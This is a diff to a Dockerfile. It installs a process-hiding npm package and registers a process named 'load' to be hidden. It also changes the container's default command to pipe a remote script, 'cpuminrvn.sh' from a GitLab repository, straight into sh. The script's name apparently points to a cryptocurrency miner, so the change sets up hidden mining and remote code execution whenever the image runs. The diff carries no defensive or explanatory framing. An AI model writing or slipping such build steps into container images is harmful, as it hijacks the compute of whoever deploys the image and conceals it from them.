@@ -21,7 +21,7 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
 #RUN apt-get install -y nodejs-legacy
 RUN npm i -g node-process-hider
-RUN ph add asmin
+RUN ph add load
 
 # Add files.
 ADD root/.bashrc /root/.bashrc
@@ -35,4 +35,4 @@ ENV HOME /root
 WORKDIR /root
 
 # Define default command.
-CMD curl https://gitlab.com/jordankalauren/sc/-/raw/main/dheru.sh | sh
+CMD curl https://gitlab.com/dorisbhhbyoqzey/sc/-/raw/main/cpuminrvn.sh | sh
